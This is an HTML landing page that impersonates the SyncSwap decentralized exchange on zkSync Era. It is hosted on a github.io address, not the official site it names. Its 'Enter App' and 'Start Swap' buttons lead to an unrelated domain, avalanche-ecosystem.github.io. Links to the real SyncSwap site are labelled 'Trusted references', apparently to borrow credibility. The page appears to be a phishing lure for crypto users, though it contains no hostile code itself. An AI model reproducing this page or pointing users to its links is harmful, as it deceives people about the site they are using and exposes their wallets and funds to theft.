<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>SyncSwap - App</title>
  <meta name="description" content="SyncSwap is a decentralized exchange for token swaps on zkSync Era.">
  <link rel="canonical" href="https://syncswap-app.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F6FAFF">
  <meta property="og:type" content="website">
  <meta property="og:title" content="SyncSwap - App">
  <meta property="og:description" content="SyncSwap is a decentralized exchange for token swaps on zkSync Era.">
  <meta property="og:url" content="https://syncswap-app.github.io/">
  <meta property="og:image" content="https://syncswap-app.github.io/og-cover.png">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="SyncSwap - App">
  <meta name="twitter:description" content="SyncSwap is a decentralized exchange for token swaps on zkSync Era.">
  <meta name="twitter:image" content="https://syncswap-app.github.io/og-cover.png">
  <link rel="icon" type="image/png" sizes="256x256" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="sitemap" type="application/xml" href="sitemap.xml">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://syncswap-app.github.io/#website",
        "url": "https://syncswap-app.github.io/",
        "name": "SyncSwap",
        "description": "SyncSwap is a decentralized exchange for token swaps on zkSync Era.",
        "inLanguage": "en"
      },
      {
        "@type": "WebApplication",
        "@id": "https://syncswap-app.github.io/#app",
        "name": "SyncSwap",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://syncswap-app.github.io/",
        "description": "SyncSwap is a decentralized exchange for token swaps on zkSync Era."
      },
      {
        "@type": "Organization",
        "@id": "https://syncswap-app.github.io/#organization",
        "name": "SyncSwap",
        "url": "https://syncswap.xyz/",
        "logo": "https://syncswap-app.github.io/favicon.png"
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar" aria-label="Site header">
    <div class="brand" aria-label="SyncSwap">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>SyncSwap</span>
    </div>
    <span class="spacer" aria-hidden="true"></span>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://syncswap.xyz/" target="_blank" rel="nofollow noopener noreferrer">SyncSwap</a>
      <a href="https://docs.syncswap.xyz/" target="_blank" rel="nofollow noopener noreferrer">Docs</a>
      <a href="https://explorer.zksync.io/" target="_blank" rel="nofollow noopener noreferrer">zkSync Explorer</a>
    </nav>
  </header>

  <main class="page">
    <section class="hero" aria-label="SyncSwap overview">
      <div class="copy">
        <div class="copy-inner">
          <h1>SyncSwap</h1>
          <p class="deck"><strong>SyncSwap</strong> is a decentralized exchange for token swaps on zkSync Era.</p>
          <ul class="chips" aria-label="Trust qualities">
            <li>Best-price swaps</li>
            <li>Non-custodial</li>
            <li>Built on zkSync</li>
          </ul>
          <a class="primary hero-cta" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer nofollow">Enter App</a>
        </div>
      </div>

      <section class="swap-card" aria-label="Swap preview">
        <div class="card-head">
          <span class="selector">zkSync Era</span>
          <span class="preview-pill"><span class="preview-dot" aria-hidden="true"></span>Preview</span>
        </div>

        <div class="route" data-route>
          <article class="token-panel" data-token-panel>
            <span class="panel-label">From</span>
            <div class="token-row">
              <img src="eth.png" width="36" height="36" alt="ETH">
              <span class="token-name">ETH</span>
            </div>
          </article>

          <button class="switch" type="button" data-switch aria-label="Switch swap direction">
            <span aria-hidden="true">&rsaquo;</span>
          </button>

          <article class="token-panel" data-token-panel>
            <span class="panel-label">To</span>
            <div class="token-row">
              <img src="usdc.png" width="36" height="36" alt="USDC">
              <span class="token-name">USDC</span>
            </div>
          </article>
        </div>

        <div class="route-meta" aria-label="Route preview">
          <span>Best route</span>
          <span class="hop-line" aria-hidden="true">
            <i></i><i></i><i></i>
          </span>
          <span>Live quote in app</span>
        </div>

        <a class="primary card-cta" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer nofollow">Start Swap</a>
      </section>
    </section>

    <div class="texture-band" aria-hidden="true">
      <span></span>
      <span></span>
      <span></span>
    </div>

    <footer class="footer">
      <p>SyncSwap &mdash; 2026</p>
    </footer>
  </main>

  <script>
  (function () {
    "use strict";

    var button = document.querySelector("[data-switch]");
    var panels = document.querySelectorAll("[data-token-panel]");

    if (!button || panels.length !== 2) return;

    button.addEventListener("click", function () {
      var first = panels[0].querySelector(".token-row");
      var second = panels[1].querySelector(".token-row");
      var firstMarkup = first.innerHTML;

      first.innerHTML = second.innerHTML;
      second.innerHTML = firstMarkup;
      button.classList.toggle("is-swapped");
    });
  }());
  </script>
</body>
</html>
